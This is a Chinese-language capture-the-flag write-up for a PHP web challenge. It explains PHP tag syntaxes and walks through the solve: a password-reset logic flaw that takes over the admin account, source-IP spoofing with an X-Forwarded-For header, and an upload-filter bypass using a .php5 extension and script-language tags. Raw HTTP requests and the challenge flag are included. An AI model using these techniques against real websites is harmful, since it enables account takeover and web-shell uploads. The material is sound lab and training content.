# BUG

> 逻辑漏洞,伪造源ip,文件上传绕过

## PHP四种标记方式

### <?php ?>

```
<?php 
    … 
?>
```

> 最常见的一种方式,也是官方推荐的方式,这种标签可以插入到HTML文档的任意位置

### 短标签

```
<?…?>
```

> 使用短标签前需要在php.ini中设置short_open_tag=on,默认是on状态

### 长标签

```
<script language="php">……</script>
```

> 这种方式写法有点像JavaScript,不过也是可以正常解析PHP代码

### asp标签

```
<％…％>
```

> 在PHP 3.0.4版后可用,需要在php.ini中设置asp_tags=on,默认是off

## 思路分析

> 打开有个登录框,还有一个注册和找回密码的地方,不存在sql注入,也没有目录信息,开始注册一个账号,注册admin用户,发现该用户已存在,注册一个其他的用户.登陆后有个manage页面无权限访问,修改密码处也不存在漏洞.发现cookie中的user字段是uid:username的md5值,伪造admin的user值,发现没啥用,无越权漏洞.回到找回密码处,这里容易存在逻辑漏洞,经测试,的确存在.修改掉了admin用户的密码,成功登陆.

> 登陆后,查看manage页面.然后提示ip不对,于是用X-Forwarded-For来绕过,访问后提示flag与/index.php?module=filemanage&do这个url有关,直接访问提示缺少action,因为是文件管理,想到upload.访问成功,是个文件上传界面.

> 文件名有限制,用php会报错,用php5绕过,内容直接用一句话内容,提示不是一个php文件,经过测试,使用php的长标签方式绕过

## payload

```
GET /index.php?module=admin HTTP/1.1
Host: 61.147.171.105:63721
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:63721/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1676894957,1676899554; PHPSESSID=27a5120124aef0b538d7d5772a1505b1; user=4b9987ccafacb8d8fc08d22bbca797ba
X-Forwarded-For: 127.0.0.1
Connection: close
```

```
POST /index.php?module=filemanage&do=upload HTTP/1.1
Host: 61.147.171.105:63721
Content-Length: 218
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:63721
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypNLsdyIjo3LZhteC
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:63721/index.php?module=filemanage&do=upload
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1676894957,1676899554; PHPSESSID=27a5120124aef0b538d7d5772a1505b1; user=4b9987ccafacb8d8fc08d22bbca797ba
Connection: close

------WebKitFormBoundarypNLsdyIjo3LZhteC
Content-Disposition: form-data; name="upfile"; filename="shell.php5"
Content-Type: image/jpeg

<script language="php"></script>
```

## flag

> cyberpeace{6b743d7b37832bb1a093f682e6d2e06b}